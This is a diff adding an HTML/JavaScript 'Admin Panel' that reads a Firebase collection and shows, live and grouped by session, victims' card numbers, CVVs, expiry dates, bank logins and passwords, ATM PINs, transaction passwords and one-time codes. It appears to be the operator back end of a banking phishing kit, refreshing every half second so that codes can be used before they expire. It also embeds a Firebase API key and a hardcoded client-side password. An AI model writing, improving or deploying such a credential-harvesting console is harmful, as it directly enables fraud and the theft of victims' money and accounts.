@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Panel</title>
+<style>
+body{font-family:Arial,sans-serif;background:#f2f2f2;margin:0;padding:0}
+header{background:#007BFF;color:#fff;padding:15px;text-align:center;font-size:20px;font-weight:bold}
+.buttons{text-align:center;margin:10px 0;display:flex;flex-wrap:wrap;justify-content:center;gap:5px}
+.buttons button{padding:6px 12px;border:none;border-radius:5px;background:#007BFF;color:#fff;cursor:pointer;font-size:14px}
+.buttons button.active{background:#0056b3}
+
+/* Dropdown settings */
+#settingOptions{display:none;margin:5px auto;text-align:center}
+#settingOptions input, #settingOptions select{padding:5px 10px;border-radius:4px;font-size:14px;margin:3px 0}
+#actionSelect:disabled{background:#ccc;cursor:not-allowed}
+
+/* Container */
+.container{max-width:600px;margin:auto;padding:10px;height:70vh;overflow-y:auto}
+
+/* Session block */
+.session-block{background:#fff;border:2px solid #28a745;border-radius:8px;padding:10px;margin-bottom:15px}
+.session-title{font-weight:bold;font-size:16px;margin-bottom:5px;word-break:break-word}
+
+/* Data item */
+.data-item{background:#f9f9f9;padding:8px;border-radius:6px;margin-bottom:8px}
+.field{display:flex;gap:4px;margin-bottom:4px;align-items:center;flex-wrap:wrap}
+.field-name{width:100px;font-weight:bold;font-size:13px;color:#333}
+.field-value{flex:1;word-break:break-word;font-size:13px;color:#222}
+.action-btn{padding:2px 6px;border:none;border-radius:3px;cursor:pointer;font-size:12px}
+.copy-btn{background:#28a745;color:white}
+.delete-btn{background:#dc3545;color:white}
+.otp-field .field-value{color:#d63384;font-weight:bold}
+small{color:gray;font-size:11px;display:block;margin-top:3px}
+
+/* Responsive tweaks */
+@media(max-width:480px){
+  .field-name{width:90px;font-size:12px}
+  .field-value{font-size:12px}
+  .buttons button{font-size:12px;padding:5px 10px}
+  header{font-size:18px;padding:12px}
+  .data-item{padding:6px}
+  .session-block{padding:8px;margin-bottom:10px}
+}
+</style>
+</head>
+<body>
+
+<header>Admin Panel</header>
+<div class="buttons">
+  <button id="allBtn" class="active">All Data</button>
+  <button id="groupBtn">Grouped Data</button>
+  <button id="settingBtn">Done Settings</button>
+</div>
+
+<div id="settingOptions">
+  <input type="password" id="adminPassword" placeholder="Enter Password">
+  <select id="actionSelect" disabled>
+    <option value="copy">Copy</option>
+    <option value="delete">Delete</option>
+  </select>
+</div>
+
+<div class="container" id="dataContainer"></div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
+import { getFirestore, collection, query, orderBy, onSnapshot, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js";
+
+// Firebase config
+const firebaseConfig = {
+  apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
+  authDomain: "ss22-a96d3.firebaseapp.com",
+  projectId: "ss22-a96d3",
+  storageBucket: "ss22-a96d3.appspot.com",
+  messagingSenderId: "607942972170",
+  appId: "1:607942972170:web:2e38b2d5410ff37f3960f3"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+const container = document.getElementById("dataContainer");
+
+// -------------------- Variables --------------------
+let allData = [], currentView = "all", sessionMap = {}, nextSession = 1;
+let currentAction = "copy"; // default action
+
+// Field Map
+const fieldMap = {
+  name:"Name", mobile:"Mobile", consumer:"Consumer", amount:"Amount", method:"Payment Method",
+  card:"Card", expiry:"Expiry", cvv:"CVV", bank:"Bank", userid:"UserId", password:"Password",
+  apin:"ATM PIN", dob:"DOB", tpass:"Transaction Password", action:"Action",
+  otp:"OTP", otp1:"OTP", enteredOtp:"OTP"
+};
+
+// -------------------- Helper Functions --------------------
+function mergeAndSort(snapshot){
+  snapshot.forEach(doc=>{
+    const data = doc.data();
+    data.id = doc.id;
+    allData.push(data);
+    const sess = data.sessionId || data.userId || "Unknown";
+    if(!sessionMap[sess]) sessionMap[sess] = nextSession++;
+  });
+  allData.sort((a,b)=>(b.createdAt?.seconds||0)-(a.createdAt?.seconds||0));
+  render();
+}
+
+function render(){
+  currentView === "all" ? renderAll(allData) : renderGrouped(allData);
+}
+
+function renderAll(dataArr){
+  container.innerHTML = "";
+  dataArr.forEach(item=>{
+    const div = document.createElement("div"); div.className = "data-item";
+    Object.keys(item).forEach(key=>{
+      if(!fieldMap[key]) return;
+      const field = document.createElement("div"); field.className = "field";
+      if(key.toLowerCase().includes("otp")) field.classList.add("otp-field");
+      const btnClass = currentAction === "copy" ? "copy-btn" : "delete-btn";
+      field.innerHTML = `<div class="field-name">${fieldMap[key]}:</div>
+                         <div class="field-value">${item[key]}</div>
+                         <button class="action-btn ${btnClass}">${currentAction === "copy" ? "Copy" : "Delete"}</button>`;
+      field.querySelector("button").onclick = ()=>handleAction(item.id,item[key]);
+      div.appendChild(field);
+    });
+    if(item.createdAt){
+      const t = document.createElement("small");
+      t.textContent = new Date(item.createdAt.seconds*1000).toLocaleString();
+      div.appendChild(t);
+    }
+    container.appendChild(div);
+  });
+}
+
+function renderGrouped(dataArr){
+  const grouped = {};
+  dataArr.forEach(item=>{
+    const sess = item.sessionId || item.userId || "Unknown";
+    if(!grouped[sess]) grouped[sess] = [];
+    grouped[sess].push(item);
+  });
+
+  container.innerHTML = "";
+  Object.keys(grouped).forEach(sess=>{
+    const sDiv = document.createElement("div"); sDiv.className = "session-block";
+    const title = document.createElement("div"); title.className = "session-title";
+    title.textContent = `Session ${sessionMap[sess]} - ${sess}`; sDiv.appendChild(title);
+
+    grouped[sess].forEach(item=>{
+      const div = document.createElement("div"); div.className = "data-item";
+      Object.keys(item).forEach(key=>{
+        if(!fieldMap[key]) return;
+        const field = document.createElement("div"); field.className = "field";
+        if(key.toLowerCase().includes("otp")) field.classList.add("otp-field");
+        const btnClass = currentAction === "copy" ? "copy-btn" : "delete-btn";
+        field.innerHTML = `<div class="field-name">${fieldMap[key]}:</div>
+                           <div class="field-value">${item[key]}</div>
+                           <button class="action-btn ${btnClass}">${currentAction === "copy" ? "Copy" : "Delete"}</button>`;
+        field.querySelector("button").onclick = ()=>handleAction(item.id,item[key]);
+        div.appendChild(field);
+      });
+      if(item.createdAt){
+        const t = document.createElement("small");
+        t.textContent = new Date(item.createdAt.seconds*1000).toLocaleString();
+        div.appendChild(t);
+      }
+      sDiv.appendChild(div);
+    });
+
+    container.appendChild(sDiv);
+  });
+}
+
+// -------------------- Action Handler --------------------
+function handleAction(id,value){
+  if(currentAction === "copy"){
+    navigator.clipboard.writeText(value);
+  } else if(currentAction === "delete"){
+    if(confirm("Are you sure to delete this entry?")){
+      deleteDoc(doc(db,"users51",id)).then(()=>console.log("Deleted",id));
+    }
+  }
+}
+
+// -------------------- Firebase Listener --------------------
+function attachListener(){
+  allData = []; sessionMap = {}; nextSession=1;
+  const q = query(collection(db,"users51"), orderBy("createdAt","desc"));
+  onSnapshot(q, mergeAndSort);
+}
+
+// Auto refresh
+setInterval(()=>{ attachListener(); }, 500);
+attachListener();
+
+// -------------------- Buttons --------------------
+const allBtn = document.getElementById("allBtn");
+const groupBtn = document.getElementById("groupBtn");
+const settingBtn = document.getElementById("settingBtn");
+const settingOptions = document.getElementById("settingOptions");
+const actionSelect = document.getElementById("actionSelect");
+const adminPassword = document.getElementById("adminPassword");
+
+allBtn.onclick = ()=>{currentView="all"; allBtn.classList.add("active"); groupBtn.classList.remove("active"); render();}
+groupBtn.onclick = ()=>{currentView="group"; groupBtn.classList.add("active"); allBtn.classList.remove("active"); render();}
+
+// Show/hide settings
+settingBtn.onclick = ()=>{
+  settingOptions.style.display = settingOptions.style.display === "none" ? "block" : "none";
+}
+
+// Password check
+adminPassword.addEventListener("input", ()=>{
+  if(adminPassword.value === "Done"){
+    actionSelect.disabled = false;
+  } else {
+    actionSelect.disabled = true;
+  }
+});
+
+actionSelect.onchange = ()=>{
+  currentAction = actionSelect.value;
+  render(); // update all buttons dynamically
+}
+</script>
+
+</body>
+</html>
